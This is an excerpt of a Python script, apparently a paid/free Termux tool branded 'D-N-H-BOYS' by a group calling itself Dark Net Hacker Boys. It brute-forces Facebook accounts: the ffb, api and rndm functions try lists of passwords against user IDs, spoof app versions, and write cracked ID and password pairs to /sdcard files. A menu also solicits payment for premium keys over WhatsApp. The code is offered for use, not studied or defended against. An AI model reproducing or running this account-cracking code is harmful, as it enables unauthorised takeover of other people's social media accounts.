...
----------------------------------------------
 Author    : ASRAF MAHDI
 Github    : D-N-H-BOYS1
 Facebook  : DARK NET HACKER BOYS
 Tool Name : D-N-H-BOYS 
 Type type : PAID/FREE
 Version   : 2.4.1
----------------------------------------------
 D-N-H-BOYS version 2.4.1
WELCOME TO DARK NET HACKER BOYS TEAM
\033[1;37m----------------------------------------------""")
def linex():
        print('\033[1;37m----------------------------------------------')
def clear():
        ...
        #       chk()
                ...
                if x == ("sex"):
                        ...
                        if xd in ['1','01']:
                                ...
                                os.system(f'xdg-open https://www.facebook.com/dark.net.hacker.boys1{wx}');menu()
                        elif xd in ['7','07']:
                                os.system('xdg-open https://www.facebook.com/dark.net.hacker.boys1');menu()
                        elif xd in ['8','08']:
                                os.system('xdg-open https://www.facebook.com/dark.net.hacker.boys1');menu()
                        elif xd in ['0','00']:
                                exit(' Thanks for use 🥰 ')
                        ...
                        linex()
                        url_wa = "https://api.whatsapp.com/send?phone=+8801827443725&text="
                        name = input(" Enter your Name : ")
                        linex()
                        tks = ("Hi Asraf mahdi Sir, I Need To Buy Your Paid D-N-H-BOYS Tools Version 1.9.0 Premium Please Accept My Key To Premium :)\n\n Name :- "+name+"\n Key :- "+fkeyx)
...
def ffb(ids,names,passlist):
        global loop,oks,cps
        sys.stdout.write('\r\r\033[1;37m [D-N-H-BOYS] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
        ...
        try:
                ...
                for fikr in passlist:
                        ...
                        if "c_user" in Aking:
                                ...
                                print('\r\r\033[1;32m [D-N-H-BOYS-OK] %s | %s'%(ids,pas))
                                open('/sdcard/D-N-H-BOYS-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in Aking:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [D-N-H-BOYS-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/D-N-H-BOYS-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        ...
                        for pw in passlist:
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [D-N-H-BOYS-OK] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/D-N-H-BOYS-OK.txt','a').write(ids+'|'+pas+'\n')
                                        oks.append(ids)
                                        break
...
def rndm(ids,passlist):
                try:
                        global ok,loop
                        sys.stdout.write('\r\r\033[1;37m [D-N-H-BOYS-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                        for pas in passlist:
                                application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
                                application_version_code=str(random.randint(000000000,999999999))
                                fbs=random.choice(fbks)
                                ...
                                if 'session_key' in q:
                                        uid=str(q['uid'])
                                        try:
                                                okk=open('/sdcard/D-N-H-BOYS-OK.txt','r').read()
                                                if uid in okk:pass
                                                else:
                                                        print('\r\r\033[1;32m [D-N-H-BOYS-OK] '+uid+' | '+pas+'\033[1;97m')
                                                        open('/sdcard/D-N-H-BOYS-OK.txt','a').write(uid+'|'+pas+'\n')
                                                        oks.append(ids)
                                                        break
                                        except:
                                                print('\r\r\033[1;32m [D-N-H-BOYS-OK] '+uid+' | '+pas+'\033[1;97m')
